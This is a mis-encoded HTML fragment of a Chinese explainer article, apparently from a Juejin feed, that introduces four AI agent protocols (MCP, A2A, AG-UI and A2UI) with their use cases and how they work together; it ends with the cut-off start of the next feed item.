<h3 data-id="heading-2">ä¸€ã€MCPåè®®ï¼šAIä¸å·¥å…·çš„â€œä¸‡èƒ½æ¥å£â€ï¼Œé€‚é…ä¸‡ç‰©ä¸è´¹åŠ²</h3>
<p><img src="https://wsrv.nl?url=http%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2F9nSMOxZ1wiaiaKJhuhDPzLs89FfscPJfCFalFQn3VMOqpFfj3HWYicWtSeibsZ6t24wH2CR4oEUxz3odR95eQqNn4A%2F0%3Ffrom%3Dappmsg" alt="" loading="lazy"/></p>
<p>MCPçš„æ ¸å¿ƒä½œç”¨å¾ˆç®€å•ï¼Œä¸€å¥è¯å°±èƒ½è¯´æ¸…ï¼šç»™AIè£…ä¸ªâ€œä¸‡èƒ½USBæ¥å£â€ï¼Œä¸ç®¡æ˜¯æ•°æ®åº“ã€è®¾è®¡è½¯ä»¶è¿˜æ˜¯åŠå…¬å·¥å…·ï¼Œæ’ä¸Šå°±èƒ½ç”¨ï¼Œå†ä¹Ÿä¸ç”¨å•ç‹¬é€‚é…ï¼Œæ•ˆç‡ç›´æ¥æä¸Šæ¥å•¦ï¼</p>
<h4 data-id="heading-3">1. æ ¸å¿ƒä¿¡æ¯ï¼ˆç®€å•è®°å°±å¥½ï¼‰</h4>
<p>å…¨ç§°ï¼šæ¨¡å‹ä¸Šä¸‹æ–‡åè®®ï¼ˆModel Context Protocolï¼‰ï¼Œç”±Claudeæ¯å…¬å¸Anthropicåœ¨2024å¹´11æœˆæ¨å‡ºï¼Œå¼€æ”¾åˆå…è´¹ï¼Œæ‰€æœ‰AIæ¡†æ¶å’Œå·¥å…·éƒ½èƒ½å…¼å®¹ï¼Œä¸»æ‰“ä¸€ä¸ªâ€œä¸‡ç‰©å¯è¿â€ã€‚</p>
<p>è¯´å¥å¤§ç™½è¯ï¼šä»¥å‰AIè°ƒç”¨ä¸ªCRMç³»ç»ŸæŸ¥æ•°æ®ï¼Œå¾—éº»çƒ¦ç¨‹åºå‘˜å†™ä¸€å †é€‚é…ä»£ç ï¼›ç°åœ¨æœ‰äº†MCPï¼Œä¸€å¥—åè®®å°±èƒ½æå®šæ‰€æœ‰ï¼Œçœä¸‹æ¥çš„æ—¶é—´ï¼Œä¸ç®¡æ˜¯æ‘¸é±¼è¿˜æ˜¯åšé¡¹ç›®éƒ½å¾ˆé¦™ï½</p>
<h4 data-id="heading-4">2. æ ¸å¿ƒåŠŸèƒ½ï¼ˆé‡ç‚¹äº†è§£ï¼‰</h4>
<p>å®ƒæ—¢æ˜¯AIçš„â€œå·¥å…·è¿æ¥å™¨â€ï¼Œä¹Ÿæ˜¯â€œå®‰å…¨å°ä¿é•–â€ï¼Œä¸¤å¤§åŠŸèƒ½éƒ½å¾ˆå®ç”¨ï¼š</p>
<ul>
<li>
<p>ä¸‡èƒ½è¿æ¥ï¼šç»™AIæ­å¥½ç»Ÿä¸€çš„æ¥å£ï¼Œä¸ç®¡æ˜¯åŠå…¬è½¯ä»¶ã€ç§‘ç ”å·¥å…·è¿˜æ˜¯ä¼ä¸šç³»ç»Ÿï¼ŒAIéƒ½èƒ½è½»æ¾å¯¹æ¥ï¼Œè‡ªåŠ¨æå–æ•°æ®ã€å®Œæˆæ“ä½œï¼Œä¸ç”¨æˆ‘ä»¬æ‰‹åŠ¨æ’æ‰‹ï¼›</p>
</li>
<li>
<p>å®‰å…¨å…œåº•ï¼šå†…ç½®å®‰å…¨éš”ç¦»æœºåˆ¶ï¼Œèƒ½é˜²æ­¢AIè¯¯åˆ æ ¸å¿ƒæ•°æ®ï¼Œä¹Ÿèƒ½é¿å…å¤–éƒ¨å·¥å…·æ³„éœ²AIçš„æ ¸å¿ƒæ¨¡å‹ï¼Œå®‰å…¨æ„Ÿæ‹‰æ»¡ï½</p>
</li>
</ul>
<h4 data-id="heading-5">3. è½åœ°åœºæ™¯ï¼ˆçœ‹å®ä¾‹ï¼Œæ›´æ˜“æ‡‚ï¼‰</h4>
<ul>
<li>
<p>æ‰“å·¥äººç¦éŸ³ï¼šAIåŠ©æ‰‹é€šè¿‡MCPå¯¹æ¥æ—¥å†ã€é‚®ä»¶ï¼Œè‡ªåŠ¨æ•´ç†æ—¥ç¨‹ã€å›å¤å¸¸ç”¨é‚®ä»¶ï¼Œå†ä¹Ÿä¸ç”¨è¢«çç¢çš„å°äº‹ç¼ å¾—å¤´å¤§ï¼›</p>
</li>
<li>
<p>ç§‘ç ”æé€Ÿï¼šç”Ÿç‰©AIé€šè¿‡MCPå¯¹æ¥åŸºå› åˆ†æå·¥å…·ï¼Œå¿«é€Ÿå¤„ç†æµ·é‡æ•°æ®ï¼Œè®©æ–°è¯ç ”å‘çš„æ•ˆç‡æ‚„æ‚„ç¿»å€ï¼›</p>
</li>
<li>
<p>ä¼ä¸šåˆšéœ€ï¼šAIå†³ç­–ç³»ç»Ÿé€šè¿‡MCPå¯¹æ¥ERPã€è´¢åŠ¡å·¥å…·ï¼Œè‡ªåŠ¨ç”ŸæˆæŠ¥è¡¨å’Œå†³ç­–å»ºè®®ï¼Œè€æ¿çœ‹äº†çœå¿ƒï¼Œæˆ‘ä»¬ä¹Ÿèƒ½å°‘åŠ ç­ã€‚</p>
</li>
</ul>
<h3 data-id="heading-6">äºŒã€A2Aåè®®ï¼šAIä¸AIçš„â€œç»„é˜Ÿå¯†ç â€ï¼ŒååŒå¹²æ´»ä¸å†…è€—</h3>
<p><img src="https://wsrv.nl?url=http%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2F9nSMOxZ1wiaiaKJhuhDPzLs89FfscPJfCFgdx3UJPbpD7MU3fR04vtKx18mfreWFH1wcMWqnKHQtx379H5gj24iaQ%2F0%3Ffrom%3Dappmsg" alt="" loading="lazy"/></p>
<p>å¦‚æœè¯´MCPæ˜¯AIå’Œå·¥å…·çš„â€œæ¥å£â€ï¼Œé‚£A2Aå°±æ˜¯AIä¹‹é—´çš„â€œç»„é˜Ÿå¯†ç â€â€”â€”èƒ½è®©ä¸åŒå¹³å°ã€ä¸åŒåŠŸèƒ½çš„AIï¼Œé¡ºç•…æ²Ÿé€šã€åˆ†å·¥åä½œï¼Œå†ä¹Ÿä¸ç”¨å„è‡ªä¸ºæˆ˜ï¼Œæå®šå¤æ‚ä»»åŠ¡ä¹Ÿå¾ˆè½»æ¾ï½</p>
<h4 data-id="heading-7">1. æ ¸å¿ƒä¿¡æ¯ï¼ˆç®€å•è®°å°±å¥½ï¼‰</h4>
<p>å…¨ç§°ï¼šæ™ºèƒ½ä½“åˆ°æ™ºèƒ½ä½“åè®®ï¼ˆAgent-to-Agent Protocolï¼‰ï¼Œç”±è°·æ­Œã€å¾®è½¯ç­‰å¤§å‚è”åˆæ¨å‡ºï¼Œå…¼å®¹æ‰€æœ‰ä¸»æµAIæ¡†æ¶ï¼Œä¸»æ‰“ä¸€ä¸ªâ€œAIç»„é˜Ÿä¸å†…è€—â€ã€‚</p>
<p>å¤§ç™½è¯è§£è¯»ï¼šä»¥å‰ç™¾åº¦æ–‡å¿ƒå’Œé˜¿é‡Œé€šä¹‰ï¼Œå°±åƒä¸¤ä¸ªè¯´ä¸åŒæ–¹è¨€çš„äººï¼Œæ²¡æ³•å¥½å¥½é…åˆå¹²æ´»ï¼›ç°åœ¨æœ‰äº†A2Aï¼Œå®ƒä»¬èƒ½ç²¾å‡†â€œå¯¹è¯â€ï¼Œä½ æŸ¥æ•°æ®ã€æˆ‘åšå¯è§†åŒ–ï¼Œåˆ†å·¥æ˜ç¡®ï¼Œæ•ˆç‡ä¹Ÿé«˜ã€‚</p>
<h4 data-id="heading-8">2. æ ¸å¿ƒåŠŸèƒ½ï¼ˆé‡ç‚¹äº†è§£ï¼‰</h4>
<p>æ ¸å¿ƒå°±æ˜¯å¸®AIâ€œç»„é˜Ÿæ‰“æ€ªâ€ï¼Œä¸¤å¤§åŠŸèƒ½ç²¾å‡†æˆ³ä¸­ç—›ç‚¹ï¼š</p>
<ul>
<li>
<p>ä»»åŠ¡æ‹†åˆ†ï¼šä¸»AIæ¥åˆ°å¤æ‚ä»»åŠ¡åï¼Œé€šè¿‡A2AæŠŠä»»åŠ¡æ‹†æˆä¸€ä¸ªä¸ªå°æ¨¡å—ï¼Œåˆ†ç»™ä¸åŒä¸“ä¸šçš„AIï¼Œæ¯”å¦‚é£æ§ä»»åŠ¡ï¼Œå°±è®©â€œé£é™©è¯†åˆ«AIâ€å’Œâ€œå¼‚å¸¸æ£€æµ‹AIâ€å„åšå„çš„æ“…é•¿é¢†åŸŸï¼›</p>
</li>
<li>
<p>å¿«é€Ÿè”åŠ¨ï¼šAIä¹‹é—´ä¸ç”¨åå¤é€‚é…ï¼Œé€šè¿‡A2Aå°±èƒ½å®æ—¶ä¼ é€’è¿›åº¦å’Œç»“æœï¼Œå‘ç°é—®é¢˜ç§’åŒæ­¥ã€ç§’è§£å†³ï¼Œå†ä¹Ÿä¸å†…è€—ã€‚</p>
</li>
</ul>
<h4 data-id="heading-9">3. è½åœ°åœºæ™¯ï¼ˆçœ‹å®ä¾‹ï¼Œæ›´æ˜“æ‡‚ï¼‰</h4>
<ul>
<li>
<p>ç”µå•†é£æ§ï¼š3ä¸ªAIç»„é˜Ÿï¼Œé€šè¿‡A2AååŒï¼Œå¿«é€Ÿè¯†åˆ«è¯ˆéª—è®¢å•ï¼Œä¿éšœäº¤æ˜“å®‰å…¨ï¼Œå†ä¹Ÿä¸ç”¨äººå·¥ä¸€ä¸ªä¸ªæ’æŸ¥ï¼Œçœäº†ä¸å°‘åŠ›ï¼›</p>
</li>
<li>
<p>åˆ›æ„è½åœ°ï¼šæ–‡æœ¬AIå†™å¥½æ–‡æ¡ˆï¼Œé€šè¿‡A2AæŠŠéœ€æ±‚ä¼ ç»™å›¾åƒAIç”Ÿæˆæµ·æŠ¥ï¼Œå†äº¤ç»™æ’ç‰ˆAIä¼˜åŒ–ï¼Œå…¨æµç¨‹è‡ªåŠ¨åŒ–ï¼Œåˆ›æ„è½åœ°ä¹Ÿèƒ½å¿«äººä¸€æ­¥ï¼›</p>
</li>
<li>
<p>å¤§è§„æ¨¡è®¡ç®—ï¼šè·¨åŒºåŸŸçš„AIé€šè¿‡A2Aç»„é˜Ÿï¼Œæå®šå…¨å›½äººå£ç»Ÿè®¡ã€æµ·é‡æ•°æ®åˆ†æï¼Œæ•ˆç‡æ¯”å•ä¸ªAIé«˜10å€ä¸æ­¢ï¼Œçœäº†å¾ˆå¤šæ—¶é—´ã€‚</p>
</li>
</ul>
<h3 data-id="heading-10">ä¸‰ã€AG-UIåè®®ï¼šAIä¸äººçš„â€œå®æ—¶èŠå¤©é€šé“â€ï¼Œäº¤äº’æµç•…ä¸å¡é¡¿</h3>
<p><img src="https://wsrv.nl?url=http%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2F9nSMOxZ1wiaiaKJhuhDPzLs89FfscPJfCFharPRuPs9dE1pQFC2viaEFl8Il6dIIjhOZcPklNpGowWx8BrVic9aicDQ%2F0%3Ffrom%3Dappmsg" alt="" loading="lazy"/></p>
<p>AIå’Œå·¥å…·ã€AIå’ŒAIéƒ½èƒ½é¡ºç•…æ²Ÿé€šäº†ï¼Œé‚£AIå’Œæˆ‘ä»¬äººæ€ä¹ˆäº’åŠ¨æ‰ä¸å¡é¡¿å‘¢ï¼Ÿç­”æ¡ˆå°±æ˜¯AG-UIâ€”â€”å®ƒå°±åƒAIå’Œå‰ç«¯ç•Œé¢çš„â€œå®æ—¶èŠå¤©é€šé“â€ï¼Œå‘æŒ‡ä»¤ç§’åé¦ˆï¼Œç•Œé¢åŒæ­¥æ›´æ–°ï¼Œä½“éªŒæ„Ÿç›´æ¥æ‹‰æ»¡ï½</p>
<h4 data-id="heading-11">1. æ ¸å¿ƒä¿¡æ¯ï¼ˆç®€å•è®°å°±å¥½ï¼‰</h4>
<p>å…¨ç§°ï¼šæ™ºèƒ½ä½“-ç”¨æˆ·äº¤äº’åè®®ï¼ˆAgent-User Interaction Protocolï¼‰ï¼Œç”±CopilotKitå›¢é˜Ÿåœ¨2025å¹´6æœˆæ¨å‡ºï¼Œè½»é‡åˆå¥½ç”¨ï¼Œæ‰€æœ‰å‰ç«¯æ¡†æ¶éƒ½èƒ½å…¼å®¹ï¼Œä¸»æ‰“ä¸€ä¸ªâ€œå®æ—¶æµç•…â€ã€‚</p>
<p>å¤§ç™½è¯è§£è¯»ï¼šä»¥å‰ç”¨AIå®¢æœï¼Œå‘ä¸ªé—®é¢˜è¦ç­‰å¥½å‡ ç§’æ‰å›å¤ï¼Œæ€¥å¾—æŠ“è€³æŒ è…®ï¼›ç°åœ¨æœ‰äº†AG-UIï¼Œå‘æ¶ˆæ¯ç§’åé¦ˆï¼Œç•Œé¢è¿˜èƒ½å®æ—¶æ˜¾ç¤ºè¿›åº¦ï¼Œå°±åƒå’Œäººé¢å¯¹é¢èŠå¤©ä¸€æ ·é¡ºç•…ã€‚</p>
<h4 data-id="heading-12">2. æ ¸å¿ƒåŠŸèƒ½ï¼ˆé‡ç‚¹äº†è§£ï¼‰</h4>
<ul>
<li>
<p>å®æ—¶åŒå‘äº¤äº’ï¼šä½ å‘æŒ‡ä»¤ï¼ŒAIç§’æ¥æ”¶ï¼›AIçš„å¤„ç†è¿›åº¦ï¼Œç•Œé¢ç§’æ›´æ–°ï¼Œæ²¡æœ‰ä¸€ä¸å»¶è¿Ÿï¼Œä½“éªŒæ„Ÿç‰¹åˆ«å¥½ï¼›</p>
</li>
<li>
<p>è·¨å¹³å°ç»Ÿä¸€ï¼šä¸ç®¡æ˜¯æ‰‹æœºAPPã€ç½‘é¡µè¿˜æ˜¯æ¡Œé¢è½¯ä»¶ï¼Œå’ŒAIçš„äº¤äº’æ–¹å¼éƒ½ä¸€æ ·ï¼Œä¸ç”¨åå¤é€‚åº”ï¼Œå°ç™½ä¹Ÿèƒ½å¿«é€Ÿä¸Šæ‰‹ï¼›</p>
</li>
<li>
<p>å®‰å…¨å¯æ§ï¼šå‰ç«¯èƒ½æ‹¦æˆªAIçš„æ•æ„Ÿæ“ä½œï¼Œæ¯”å¦‚è°ƒç”¨ä½ çš„éšç§æ•°æ®ï¼Œå®‰å…¨æ„Ÿç›´æ¥æ‹‰æ»¡ï¼Œç”¨èµ·æ¥æ›´æ”¾å¿ƒã€‚</p>
</li>
</ul>
<h4 data-id="heading-13">3. è½åœ°åœºæ™¯ï¼ˆçœ‹å®ä¾‹ï¼Œæ›´æ˜“æ‡‚ï¼‰</h4>
<ul>
<li>
<p>æ™ºèƒ½å®¢æœï¼šå’¨è¯¢ç‰©æµçš„æ—¶å€™ï¼Œç•Œé¢å®æ—¶æ˜¾ç¤ºè¿›åº¦æ¡ï¼ŒAIä¸€è¾¹å›å¤ï¼Œä¸€è¾¹åŒæ­¥ç‰©æµèŠ‚ç‚¹ï¼Œå†ä¹Ÿä¸ç”¨åå¤è¿½é—®â€œæˆ‘çš„å¿«é€’åˆ°å“ªäº†â€ï¼›</p>
</li>
<li>
<p>æ•™è‚²AIï¼šè¾“å…¥è§£é¢˜æ­¥éª¤ï¼Œç•Œé¢ç§’å‡ºæ‰¹æ”¹æ„è§ï¼Œè¿˜èƒ½è‡ªåŠ¨ç”Ÿæˆç»ƒä¹ é¢˜ï¼ŒæŸ¥æ¼è¡¥ç¼ºä¹Ÿå˜å¾—å¾ˆè½»æ¾ï¼›</p>
</li>
<li>
<p>å›¢é˜Ÿåä½œï¼šAIåŠ©æ‰‹å®æ—¶åŒæ­¥ä»»åŠ¡è¿›åº¦ï¼Œè°å®Œæˆäº†ã€è°æ²¡å®Œæˆï¼Œç•Œé¢ä¸€ç›®äº†ç„¶ï¼Œå›¢é˜Ÿåä½œä¹Ÿä¸å†…è€—ï¼Œæ•ˆç‡æ›´é«˜ã€‚</p>
</li>
</ul>
<h3 data-id="heading-14">å››ã€A2UIåè®®ï¼šç”Ÿæˆå¼UIçš„â€œæ ‡å‡†æ¨¡æ¿â€ï¼Œç•Œé¢ç”Ÿæˆä¸ç¿»è½¦</h3>
<p><img src="https://wsrv.nl?url=http%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2F9nSMOxZ1wiaiaKJhuhDPzLs89FfscPJfCF6mSVOVUQRibW7cnU3JhIUXpsDDiaiazQtn6KbLJIKSsnEQmP7HknFtwew%2F0%3Ffrom%3Dappmsg" alt="" loading="lazy"/></p>
<p>æœ€åè¿™ä¸ªåè®®ï¼Œå’Œæˆ‘ä»¬çš„è§†è§‰ä½“éªŒç›´æ¥ç›¸å…³â€”â€”A2UIï¼Œå®ƒå°±åƒæ˜¯ç”Ÿæˆå¼UIçš„â€œæ ‡å‡†æ¨¡æ¿â€ï¼Œèƒ½è®©AIç”Ÿæˆçš„ç•Œé¢è§„èŒƒã€å¥½ç”¨ã€ä¸ç¿»è½¦ï¼Œå†ä¹Ÿä¸ç”¨é¢å¯¹æ‚ä¹±æ— ç« çš„ç•Œé¢å¤´ç–¼å•¦ï½</p>
<h4 data-id="heading-15">1. æ ¸å¿ƒä¿¡æ¯ï¼ˆç®€å•è®°å°±å¥½ï¼‰</h4>
<p>å…¨ç§°ï¼šæ™ºèƒ½ä½“åˆ°ç”¨æˆ·ç•Œé¢åè®®ï¼ˆAgent-to-User Interfaceï¼‰ï¼Œç”±è°·æ­Œåœ¨2025å¹´åº•å¼€æºæ¨å‡ºï¼Œç›¸å½“äºAIç”Ÿæˆç•Œé¢çš„â€œæ ‡å‡†åŒ–è“å›¾â€ï¼ŒAIç…§ç€åšï¼Œç•Œé¢å°±ä¸ä¼šç¿»è½¦ã€‚</p>
<p>è¡¥å……ä¸€å¥ï¼šç”Ÿæˆå¼UIå°±æ˜¯AIæ ¹æ®ä½ çš„éœ€æ±‚ï¼Œå®æ—¶ç”Ÿæˆå¯æ“ä½œç•Œé¢çš„æŠ€æœ¯ï¼Œè€ŒA2UIå°±æ˜¯è¿™å¥—æŠ€æœ¯çš„â€œæ ¸å¿ƒè§„åˆ™â€ï¼Œæ²¡æœ‰å®ƒï¼ŒAIç”Ÿæˆçš„ç•Œé¢å¤§æ¦‚ç‡æ²¡æ³•ç”¨å“¦ï¼</p>
<h4 data-id="heading-16">2. æ ¸å¿ƒåŠŸèƒ½ï¼ˆé‡ç‚¹äº†è§£ï¼‰</h4>
<ul>
<li>
<p>ç•Œé¢æ ‡å‡†åŒ–ï¼šAIç”Ÿæˆç•Œé¢æ—¶ï¼ŒæŒ‰ç…§A2UIçš„è§„åˆ™æ¥ï¼Œä¸ç®¡æ˜¯Webç«¯è¿˜æ˜¯æ‰‹æœºç«¯ï¼Œç•Œé¢éƒ½è§„èŒƒç»Ÿä¸€ï¼Œå…¼å®¹æ€§æ‹‰æ»¡ï¼Œä¸ç”¨å†æ‹…å¿ƒé€‚é…é—®é¢˜ï¼›</p>
</li>
<li>
<p>å®‰å…¨åˆ†å±‚ï¼šæŠŠç•Œé¢åˆ†æˆ3ä¸ªå®‰å…¨ç­‰çº§ï¼Œç®€å•çš„å±•ç¤ºç•Œé¢ç›´æ¥ç”¨ï¼Œæ¶‰åŠæ”¯ä»˜ã€è¡¨å•çš„ç•Œé¢éœ€è¦ç¡®è®¤åå†ç”¨ï¼Œèƒ½æœç»æ¶æ„é£é™©ï¼›</p>
</li>
<li>
<p>é«˜æ•ˆæ¸²æŸ“ï¼šä¸ç”¨é‡æ–°ç”Ÿæˆæ•´ä¸ªç•Œé¢ï¼Œåªæ›´æ–°éœ€è¦ä¿®æ”¹çš„éƒ¨åˆ†ï¼Œé€Ÿåº¦æ›´å¿«ã€æ›´çœæµé‡ï¼Œä½“éªŒæ„Ÿä¹Ÿæ›´å¥½ã€‚</p>
</li>
</ul>
<h4 data-id="heading-17">3. è½åœ°åœºæ™¯ï¼ˆçœ‹å®ä¾‹ï¼Œæ›´æ˜“æ‡‚ï¼‰</h4>
<ul>
<li>
<p>ä½ä»£ç ç¦éŸ³ï¼šç”¨è‡ªç„¶è¯­è¨€è¯´â€œè¦ä¸€ä¸ªå‘˜å·¥ç™»è®°è¡¨â€ï¼ŒAIç…§ç€A2UIç”Ÿæˆç•Œé¢ï¼Œä¸ç”¨ç¨‹åºå‘˜å†™ä»£ç ï¼Œå°ç™½ä¹Ÿèƒ½è½»æ¾æå®šï¼›</p>
</li>
<li>
<p>ä¸ªæ€§åŒ–é€‚é…ï¼šAIä¼šæ ¹æ®ä½ çš„ä½¿ç”¨ä¹ æƒ¯ï¼Œç”Ÿæˆå®šåˆ¶åŒ–çš„ç•Œé¢ï¼Œå¸¸ç”¨åŠŸèƒ½æ”¾åœ¨é¦–é¡µï¼Œæ“ä½œèµ·æ¥æ›´ä¾¿æ·ï¼Œä¸ç”¨åˆ°å¤„æ‰¾ï¼›</p>
</li>
<li>
<p>ä¼ä¸šä¸´æ—¶éœ€æ±‚ï¼šéœ€è¦å¿«é€Ÿç”Ÿæˆä¸´æ—¶æŠ¥è¡¨ç•Œé¢æ—¶ï¼ŒAIèƒ½é€šè¿‡A2UIå¿«é€Ÿæå®šï¼Œç”¨å®Œè¿˜èƒ½ç›´æ¥åˆ ï¼Œä¸ç”¨æŠ•å…¥å¤§é‡å¼€å‘æˆæœ¬ï¼Œçœå¿ƒåˆé«˜æ•ˆã€‚</p>
</li>
</ul>
<h3 data-id="heading-18">å…³é”®è”åŠ¨ï¼š4å¤§åè®®æ€ä¹ˆç»„é˜Ÿå¹²æ´»ï¼Ÿï¼ˆ10ç§’çœ‹æ‡‚ï¼‰</h3>
<p><img src="https://wsrv.nl?url=http%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2F9nSMOxZ1wiaiaKJhuhDPzLs89FfscPJfCF44zxfZOIm3iceJTsWnPRJicndYicMSvazicfUeYMdCjnnicsuZI1iczmx9Mg%2F0%3Ffrom%3Dappmsg" alt="" loading="lazy"/></p>
<p>è¿™4ä¸ªåè®®ä¸æ˜¯å•ç‹¬å¹²æ´»ï¼Œè€Œæ˜¯ä¸€èµ·ç»„é˜Ÿå‘åŠ›ï¼Œç»™å¤§å®¶ä¸¾ä¸ªæ‰“å·¥äººæœ€ç†Ÿæ‚‰çš„ä¾‹å­ï¼Œä¸€çœ‹å°±æ‡‚å®ƒä»¬çš„è”åŠ¨é€»è¾‘ï¼š</p>
<ol>
<li>
<p>ä½ ç»™AIåŠå…¬åŠ©æ‰‹å‘æŒ‡ä»¤ï¼šâ€œåˆ†ææœ¬æœˆé”€å”®æ•°æ®ï¼Œç”Ÿæˆå¯è§†åŒ–æŠ¥è¡¨â€ï¼ˆè¿™ä¸ªæŒ‡ä»¤ä¼šé€šè¿‡AG-UIå®æ—¶ä¼ ç»™ä¸»AIï¼‰ï¼›</p>
</li>
<li>
<p>ä¸»AIé€šè¿‡A2Aï¼ŒæŠŠè¿™ä¸ªå¤æ‚ä»»åŠ¡æ‹†ç»™â€œæ•°æ®æŸ¥è¯¢AIâ€å’Œâ€œå¯è§†åŒ–AIâ€ï¼Œåˆ†å·¥å¾ˆæ˜ç¡®ï¼›</p>
</li>
<li>
<p>æ•°æ®æŸ¥è¯¢AIé€šè¿‡MCPå¯¹æ¥é”€å”®æ•°æ®åº“ï¼Œæå–å®Œæ•°æ®åï¼Œå†é€šè¿‡A2Aä¼ ç»™å¯è§†åŒ–AIï¼›</p>
</li>
<li>
<p>å¯è§†åŒ–AIç”ŸæˆæŠ¥è¡¨åï¼Œé€šè¿‡A2Aåé¦ˆç»™ä¸»AIï¼Œä¸»AIå†æŒ‰ç…§A2UIç”Ÿæˆç•Œé¢æè¿°ï¼›</p>
</li>
<li>
<p>ä¸»AIé€šè¿‡AG-UIï¼ŒæŠŠæŠ¥è¡¨ç•Œé¢å®æ—¶æ¸²æŸ“åˆ°ä½ é¢å‰ï¼Œä½ ç‚¹å‡»æ“ä½œï¼Œåé¦ˆä¹Ÿèƒ½ç§’ä¼ ç»™AIï¼›</p>
</li>
<li>
<p>å…¨ç¨‹åªè¦å‡ ç§’ï¼Œä¸ç”¨ä½ æ‰‹åŠ¨åšä»»ä½•æ“ä½œï¼Œæ•ˆç‡ç›´æ¥æ‹‰æ»¡ï¼Œæ˜¯ä¸æ˜¯å¾ˆæ–¹ä¾¿ï½</p>
</li>
</ol>
<h3 data-id="heading-19">æœªæ¥è¶‹åŠ¿ï¼šè¿™4ä¸ªåè®®ï¼Œä¼šæ”¹å†™AIæ ¼å±€å—ï¼Ÿ</h3>
<p>ç­”æ¡ˆæ˜¯ï¼šè‚¯å®šä¼šï¼éšç€AIæ™ºèƒ½ä½“è¶Šæ¥è¶Šæ™®åŠï¼Œè¿™4å¤§åè®®ä¼šæ…¢æ…¢æˆä¸ºè¡Œä¸šæ ‡å‡†ï¼Œæœ‰3ä¸ªå½±å“æœ€å€¼å¾—æˆ‘ä»¬å…³æ³¨ï¼Œä¸ç®¡æ˜¯å°ç™½è¿˜æ˜¯ä»ä¸šè€…ï¼Œç®€å•è®°ä¸€ä¸‹å°±å¥½ï¼š</p>
<ul>
<li>
<p>å¼€å‘æ›´ç®€å•ï¼šä»¥ååšAIåº”ç”¨ï¼Œä¸ç”¨å†å•ç‹¬é€‚é…å·¥å…·å’Œç•Œé¢ï¼Œä¸€å¥—åè®®å°±èƒ½æå®šï¼Œé—¨æ§›ç›´æ¥æ‹‰ä½ï¼Œæ™®é€šäººä¹Ÿèƒ½å‚ä¸AIåˆ›æ–°ï¼›</p>
</li>
<li>
<p>ä½“éªŒæ›´æµç•…ï¼šAIäº¤äº’ä¼šè¶Šæ¥è¶Šè‡ªç„¶ï¼Œå®ç°â€œæ— æ„ŸçŸ¥è”åŠ¨â€ï¼Œå°±åƒæˆ‘ä»¬ç°åœ¨ç”¨æ‰‹æœºä¸€æ ·ï¼Œä¸ç”¨å…³æ³¨åº•å±‚é€»è¾‘ï¼Œå¥½ç”¨ã€é¡ºæ‰‹å°±å¤Ÿäº†ï¼›</p>
</li>
<li>
<p>åº”ç”¨æ›´å¹¿æ³›ï¼šåŠå…¬ã€æ•™è‚²ã€åŒ»ç–—ã€å·¥ä¸šè¿™äº›é¢†åŸŸï¼Œéƒ½ä¼šæœ‰AIæ™ºèƒ½ä½“çš„èº«å½±ï¼ŒçœŸæ­£å®ç°â€œAIèµ‹èƒ½å„è¡Œå„ä¸šâ€ï¼Œæˆ‘ä»¬æ‰“å·¥äººä¹Ÿèƒ½çœæ›´å¤šæ—¶é—´ï½</p>
</li>
</ul>
<p><img src="https://wsrv.nl?url=http%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2F9nSMOxZ1wiaiaKJhuhDPzLs89FfscPJfCFMzt4PPEQW45hRgoArX65iallOI0TYujIeusFhibZmUibDG1A2YfNiaSuZw%2F0%3Ffrom%3Dappmsg" alt="" loading="lazy"/></p>
<p>çœ‹åˆ°è¿™é‡Œï¼Œç›¸ä¿¡ä½ å·²ç»è½»æ¾æ‹¿æäº†4å¤§åè®®çš„æ ¸å¿ƒå•¦ï¼æœ€åæ¥ä¸ªå°äº’åŠ¨ï¼šä½ å¹³æ—¶ç”¨AIå·¥å…·æ—¶ï¼Œæœ‰æ²¡æœ‰æ„Ÿå—åˆ°è¿™äº›åè®®çš„â€œéšå½¢åŠ©åŠ›â€ï¼Ÿä½ è§‰å¾—å“ªç±»åè®®æœ€å®ç”¨ï¼Ÿ</p>
<p>ç•™è¨€åŒºèŠèŠä½ çš„çœ‹æ³•ï¼Œä¸€èµ·è·Ÿä¸ŠAIæ½®æµï½</p>
<p>è§‰å¾—æœ‰ç”¨çš„è¯ï¼Œç‚¹èµ+æ”¶è—+è½¬å‘ï¼Œåˆ†äº«ç»™èº«è¾¹çš„æ‰“å·¥äººå’ŒAIçˆ±å¥½è€…ï¼Œä¸€èµ·æ¶¨çŸ¥è¯†ã€ææ•ˆç‡</p>
<p>#AIåè®®ç§‘æ™® #AIæ™ºèƒ½ä½“åº•å±‚æŠ€æœ¯ #ç§‘æŠ€å¹²è´§ #AIåŠå…¬æŠ€å·§ #å‰æ²¿ç§‘æŠ€è§£è¯»</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SpringBoot æ¥å£è·å–å‚æ•°çš„æ³¨è§£è¯¦ç»†ä»‹ç»]]></title>    <link>https://juejin.cn/post/7601000638344232975</link>    <guid>https://juejin.cn/post/7601000638344232975</guid>    <pubDate>2026-01-31T03:11:16.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7601000638344232975" data-draft-id="7600976289064681472" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SpringBoot æ¥å£è·å–å‚æ•°çš„æ³¨è§£è¯¦ç»†ä»‹ç»"/> <meta itemprop="keywords" content="Java,Spring Boot,Spring"/> <meta itemprop="datePublished" content="2026-01-31T03:11:16.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸€çº¿å¤§ç "/> <meta itemprop="url" content="https://juejin.cn/user/3280598429340984"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta 